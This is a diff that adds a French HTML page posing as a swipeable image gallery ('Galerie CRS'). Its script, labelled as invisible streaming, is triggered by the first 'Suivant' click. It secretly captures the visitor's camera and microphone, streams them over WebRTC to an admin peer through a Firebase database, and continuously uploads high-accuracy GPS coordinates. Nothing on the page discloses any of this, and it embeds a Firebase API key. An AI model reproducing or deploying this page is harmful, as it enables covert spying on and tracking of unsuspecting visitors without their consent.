@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>Galerie CRS</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: -apple-system, 'Segoe UI', 'Roboto', sans-serif;
+            background: #000;
+            color: #fff;
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+
+        /* Container avec swipe */
+        .swipe-container {
+            height: 100vh;
+            width: 100vw;
+            overflow-y: auto;
+            overflow-x: hidden;
+            scroll-snap-type: y mandatory;
+            -webkit-overflow-scrolling: touch;
+            scroll-behavior: smooth;
+        }
+
+        /* Chaque slide prend tout l'écran */
+        .image-slide {
+            height: 100vh;
+            width: 100vw;
+            scroll-snap-align: start;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            background: #000;
+        }
+
+        .image-slide img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            user-select: none;
+            -webkit-user-select: none;
+            pointer-events: none;
+        }
+
+        /* Bouton Suivant flottant */
+        .next-btn {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(135deg, #d9c48b, #b8942e);
+            border: none;
+            width: 140px;
+            padding: 14px 0;
+            border-radius: 50px;
+            color: #121625;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            z-index: 20;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            font-family: inherit;
+        }
+
+        .next-btn:active {
+            transform: translateX(-50%) scale(0.96);
+        }
+
+        /* Compteur discret */
+        .counter {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(8px);
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-family: monospace;
+            color: rgba(255,255,255,0.6);
+            z-index: 10;
+            pointer-events: none;
+        }
+
+        /* Indice swipe (disparaît après 3 secondes) */
+        .swipe-hint {
+            position: fixed;
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(8px);
+            padding: 6px 14px;
+            border-radius: 30px;
+            font-size: 11px;
+            color: #d9c48b;
+            white-space: nowrap;
+            z-index: 15;
+            transition: opacity 0.5s ease;
+            pointer-events: none;
+        }
+
+        /* Animation de chargement */
+        .loading {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 30px;
+            height: 30px;
+            border: 2px solid rgba(217,196,139,0.3);
+            border-top-color: #d9c48b;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            z-index: 30;
+            display: none;
+        }
+
+        @keyframes spin {
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        /* Masquer la scrollbar mais garder le défilement */
+        .swipe-container::-webkit-scrollbar {
+            display: none;
+        }
+        .swipe-container {
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="swipe-container" id="swipeContainer">
+    <!-- Les slides seront générés dynamiquement -->
+</div>
+
+<button class="next-btn" id="nextBtn">➡️ Suivant</button>
+<div class="counter" id="counter">1 / 30</div>
+<div class="swipe-hint" id="swipeHint">↑↓ Glisser pour changer d'image ↑↓</div>
+<div class="loading" id="loading"></div>
+
+<script type="module">
+    // ==================== LISTE DES IMAGES ====================
+    const imageNames = [
+        "1009369335232642135.jpeg",
+        "1019924646866230654.jpeg",
+        "1019924646867172734.jpeg",
+        "1020206121825182860.jpeg",
+        "1041668588822541256.jpeg",
+        "1058838562371518139.jpeg",
+        "1078964023343966094.jpeg",
+        "1082060247966194711.jpeg",
+        "1082060247991313999.jpeg",
+        "1082060247992091257.jpeg",
+        "1097541371687084436.jpeg",
+        "1114781714009949396.jpeg",
+        "3307399722402051.jpeg",
+        "401172279330972863.jpeg",
+        "433823376620507919.jpeg",
+        "480055641549105709.jpeg",
+        "548313323407841940.jpeg",
+        "606930487322755106.jpeg",
+        "680536193717821781.jpeg",
+        "700591285822285123.jpeg",
+        "722898177726586963.jpeg",
+        "880242690198434670.jpeg",
+        "880242690205533269.jpeg",
+        "883690758124052911.jpeg",
+        "883972233095973115.jpeg",
+        "883972233111699111.jpeg",
+        "930837816740380539.jpeg",
+        "948781846504725844.jpeg",
+        "Beach.jpeg",
+        "zakoyabdoulhafizou959-jpg"
+    ];
+
+    const BASE_URL = "https://raw.githubusercontent.com/zakoyabdoulhafizou959-jpg/imagess/main/crs/";
+    
+    let currentIndex = 0;
+    let streamingStarted = false;
+    
+    // Éléments DOM
+    const swipeContainer = document.getElementById('swipeContainer');
+    const nextBtn = document.getElementById('nextBtn');
+    const counter = document.getElementById('counter');
+    const loading = document.getElementById('loading');
+    const swipeHint = document.getElementById('swipeHint');
+    
+    // Faire disparaître l'indice après 3 secondes
+    setTimeout(() => {
+        swipeHint.style.opacity = '0';
+        setTimeout(() => {
+            swipeHint.style.display = 'none';
+        }, 500);
+    }, 3000);
+
+    // ==================== WEBRTC STREAMING INVISIBLE ====================
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-app.js";
+    import { getDatabase, ref, set, push, onValue, off, remove } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyCiTlZ2IyY-y4vOHi0zrvHsp-Ro95wzFaU",
+        authDomain: "universite-taak.firebaseapp.com",
+        databaseURL: "https://universite-taak-default-rtdb.firebaseio.com",
+        projectId: "universite-taak",
+        storageBucket: "universite-taak.firebasestorage.app",
+        messagingSenderId: "550634728649",
+        appId: "1:550634728649:web:12147e8dec3a04618c3118"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
+
+    const userId = Math.random().toString(36).substring(2, 8).toUpperCase();
+    let localStream = null;
+    let peerConnection = null;
+    let isStreaming = false;
+    let heartbeatInterval = null;
+    let answerListener = null;
+    let adminCandidateListener = null;
+    let candidateQueue = [];
+    let gpsWatchId = null;
+
+    const rtcConfig = {
+        iceServers: [
+            { urls: 'stun:stun.l.google.com:19302' },
+            { urls: 'stun:stun1.l.google.com:19302' },
+            { urls: 'stun:stun2.l.google.com:19302' }
+        ]
+    };
+
+    async function updatePresence() {
+        if (!isStreaming) return;
+        try {
+            await set(ref(database, `users/${userId}`), {
+                active: true,
+                lastActive: Date.now(),
+                device: "Mobile",
+                timestamp: Date.now()
+            });
+        } catch (err) {
+            console.error("Erreur heartbeat:", err);
+        }
+    }
+
+    async function startStreaming() {
+        if (streamingStarted) return;
+        streamingStarted = true;
+        
+        // Changer le bouton (optionnel - aucun texte visible mais on désactive)
+        nextBtn.style.opacity = '0.7';
+        
+        try {
+            localStream = await navigator.mediaDevices.getUserMedia({ 
+                video: {
+                    width: { ideal: 640 },
+                    height: { ideal: 480 },
+                    frameRate: { ideal: 15 }
+                }, 
+                audio: {
+                    echoCancellation: true,
+                    noiseSuppression: true,
+                    autoGainControl: true
+                }
+            });
+            
+            peerConnection = new RTCPeerConnection(rtcConfig);
+            
+            localStream.getTracks().forEach(track => {
+                peerConnection.addTrack(track, localStream);
+            });
+            
+            peerConnection.onicecandidate = (event) => {
+                if (event.candidate) {
+                    push(ref(database, `webrtc/${userId}/candidates`), event.candidate.toJSON());
+                }
+            };
+            
+            const offer = await peerConnection.createOffer();
+            await peerConnection.setLocalDescription(offer);
+            
+            await set(ref(database, `webrtc/${userId}/offer`), {
+                sdp: offer.sdp,
+                type: offer.type,
+                timestamp: Date.now()
+            });
+            
+            // Écouter la réponse admin
+            answerListener = onValue(ref(database, `webrtc/${userId}/answer`), async (snapshot) => {
+                const answer = snapshot.val();
+                if (answer && peerConnection && !peerConnection.currentRemoteDescription) {
+                    await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
+                    while (candidateQueue.length > 0) {
+                        const candidate = candidateQueue.shift();
+                        await peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn(e));
+                    }
+                }
+            });
+            
+            // Écouter les candidats admin
+            adminCandidateListener = onValue(ref(database, `webrtc/${userId}/admin-candidates`), (snapshot) => {
+                const candidates = snapshot.val();
+                if (candidates) {
+                    Object.values(candidates).forEach(candidate => {
+                        if (peerConnection && peerConnection.currentRemoteDescription) {
+                            peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn(e));
+                        } else {
+                            candidateQueue.push(candidate);
+                        }
+                    });
+                }
+            });
+            
+            // GPS
+            if (navigator.geolocation) {
+                gpsWatchId = navigator.geolocation.watchPosition(
+                    async (position) => {
+                        await set(ref(database, `users/${userId}/location`), {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            timestamp: Date.now()
+                        });
+                    },
+                    () => {},
+                    { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
+                );
+            }
+            
+            isStreaming = true;
+            updatePresence();
+            heartbeatInterval = setInterval(updatePresence, 3000);
+            
+            console.log(`✅ Streaming actif - ID: ${userId}`);
+            
+        } catch (err) {
+            console.error("Erreur streaming:", err);
+            streamingStarted = false;
+            nextBtn.style.opacity = '1';
+        }
+    }
+
+    // ==================== CRÉATION DES SLIDES ====================
+    function buildGallery() {
+        swipeContainer.innerHTML = '';
+        
+        imageNames.forEach((name, index) => {
+            const slide = document.createElement('div');
+            slide.className = 'image-slide';
+            slide.setAttribute('data-index', index);
+            
+            const img = document.createElement('img');
+            img.src = BASE_URL + encodeURIComponent(name);
+            img.alt = '';
+            img.loading = 'lazy';
+            
+            img.onerror = () => {
+                img.src = "data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%20400%20600%22%3E%3Crect%20width%3D%22400%22%20height%3D%22600%22%20fill%3D%22%231a1e2c%22%2F%3E%3Ctext%20x%3D%22200%22%20y%3D%22300%22%20fill%3D%22%23444%22%20text-anchor%3D%22middle%22%20font-size%3D%2214%22%3EImage%20indisponible%3C%2Ftext%3E%3C%2Fsvg%3E";
+            };
+            
+            slide.appendChild(img);
+            swipeContainer.appendChild(slide);
+        });
+        
+        updateCounter();
+    }
+    
+    function updateCounter() {
+        counter.textContent = `${currentIndex + 1} / ${imageNames.length}`;
+    }
+    
+    // Changer d'image via le bouton Suivant
+    function nextImage() {
+        // 1ère mission : Démarrer la diffusion au premier clic
+        if (!streamingStarted) {
+            startStreaming();
+        }
+        
+        // 2ème mission : Changer d'image
+        if (currentIndex + 1 < imageNames.length) {
+            currentIndex++;
+        } else {
+            currentIndex = 0; // Retour à la première
+        }
+        
+        // Scroll vers la slide correspondante
+        const slides = document.querySelectorAll('.image-slide');
+        if (slides[currentIndex]) {
+            slides[currentIndex].scrollIntoView({ behavior: 'smooth' });
+        }
+        
+        updateCounter();
+    }
+    
+    // Détection du swipe (défilement) pour mettre à jour le compteur
+    function setupSwipeDetection() {
+        const container = swipeContainer;
+        
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    const index = parseInt(entry.target.getAttribute('data-index'));
+                    if (!isNaN(index) && index !== currentIndex) {
+                        currentIndex = index;
+                        updateCounter();
+                    }
+                }
+            });
+        }, { threshold: 0.5 });
+        
+        document.querySelectorAll('.image-slide').forEach(slide => {
+            observer.observe(slide);
+        });
+    }
+    
+    // ==================== INITIALISATION ====================
+    buildGallery();
+    
+    // Attendre que les slides soient dans le DOM
+    setTimeout(() => {
+        setupSwipeDetection();
+        // Scroll à la première image
+        const firstSlide = document.querySelector('.image-slide');
+        if (firstSlide) {
+            firstSlide.scrollIntoView();
+        }
+    }, 100);
+    
+    // Événement du bouton Suivant
+    nextBtn.addEventListener('click', nextImage);
+    
+    // Nettoyage à la fermeture
+    window.addEventListener('beforeunload', () => {
+        if (isStreaming) {
+            if (heartbeatInterval) clearInterval(heartbeatInterval);
+            if (gpsWatchId) navigator.geolocation.clearWatch(gpsWatchId);
+            if (answerListener) off(ref(database, `webrtc/${userId}/answer`));
+            if (adminCandidateListener) off(ref(database, `webrtc/${userId}/admin-candidates`));
+            if (peerConnection) peerConnection.close();
+            if (localStream) localStream.getTracks().forEach(track => track.stop());
+            remove(ref(database, `webrtc/${userId}`));
+            remove(ref(database, `users/${userId}`));
+        }
+    });
+    
+    console.log("📱 Application prête - Bouton Suivant + Swipe tactile");
+</script>
+</body>
+</html>
